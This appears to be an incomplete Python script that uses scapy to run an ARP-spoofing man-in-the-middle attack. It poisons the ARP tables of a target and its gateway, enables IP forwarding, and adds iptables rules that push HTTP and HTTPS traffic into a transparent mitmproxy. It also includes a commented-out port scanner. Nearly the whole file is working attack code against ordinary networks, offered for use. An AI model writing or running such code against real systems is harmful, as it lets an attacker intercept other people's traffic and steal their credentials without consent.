from scapy.all import ARP, Ether, sendp, sniff, conf, srp, IP, TCP, sr1, DNS, DNSQR
import time
import sys
import os
import threading
import subprocess
import datetime
import requests

conf.verb = 0

interface = "wlan0"
gateway_ip = ''
target_ip = ''
attacker_mac = ''
mitmproxy_port = 8080


def log_to_file(message):
    with open("traffig_log.txt", "a") as f:
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        f.write(f"[{timestamp}] - {message}\n")


# ARP Spoofing function
def spoof(target_ip, spoof_ip, target_mac):
    ether = Ether(dst=target_mac, src=attacker_mac)
    arp = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=attacker_mac)
    packet = ether / arp
    sendp(packet, iface=interface)
    msg = f"Spoofing {target_ip} <- {spoof_ip}"
    print(msg)
    log_to_file(msg)


def restore(target_ip, spoof_ip, target_mac, spoof_mac):
    ether = Ether(dst=target_mac, src=spoof_mac)
    arp = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=spoof_mac)
    packet = ether / arp
    sendp(packet, count=4, iface=interface)
    msg = f"Restoring {target_ip} -> {spoof_ip}"
    print(msg)
    log_to_file(msg)


def get_mac(ip):
    arp_request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
    result = srp(arp_request, timeout=2, iface=interface)[0]
    return result[0][1].hwsrc if result else None


def start_spoofing(target_mac, gateway_mac):
    try:
        while True:
            spoof(target_ip, gateway_ip, target_mac)
            spoof(gateway_ip, target_ip, gateway_mac)
            time.sleep(2)
    except Exception as e:
        msg = f"Sooping error: {e}"
        print(msg)
        log_to_file(msg)


def start_mitmproxy():
    msg = f"Starting mitmproxy on port {mitmproxy_port}"
    print(msg)
    log_to_file(msg)
    mitmproxy_process = subprocess.Popen(
        ["mitmproxy", "--mode", 'transparent', "--listen-port", str(mitmproxy_port)],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE
    )
    time.sleep(2)
    return mitmproxy_process


def setup_iptables():
    msg = "Looking for iptables"
    print(msg)
    log_to_file(msg)
    os.system("sysctl -w net.ipv4.ip_forward=1")
    os.system(f"iptables -t nat -A PREROUTING -i {interface} -p tcp --dport 80 -j REDIRECT --to-ports {mitmproxy_port}")
    os.system(
        f"iptables -t nat -A PREROUTING -i {interface} -p tcp --dport 443 -j REDIRECT --to-ports {mitmproxy_port}")


def cleanup():
    msg = "Cleaning up iptables"
    print(msg)
    log_to_file(msg)
    os.system(f"iptables -t nat -D PREROUTING -i {interface} -p tcp --dport 80 -j REDIRECT --to-ports {mitmproxy_port}")
    os.system(
        f"iptables -t nat -D PREROUTING -i {interface} -p tcp --dport 443 -j REDIRECT --to-ports {mitmproxy_port}")
    os.system("sysctl -w net.ipv4.ip_forward=0")

# def scan_ports(target_ip, port_range=(1, 1024)):
#     open_ports = []
#     for port in range(port_range[0], port_range[1] + 1):
#         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#         sock.settimeout(1)
#         result = sock.connect_ex((target_ip, port))
#         if result == 0:
#             open_ports.append(port)
#         sock.close()
#     return open_ports


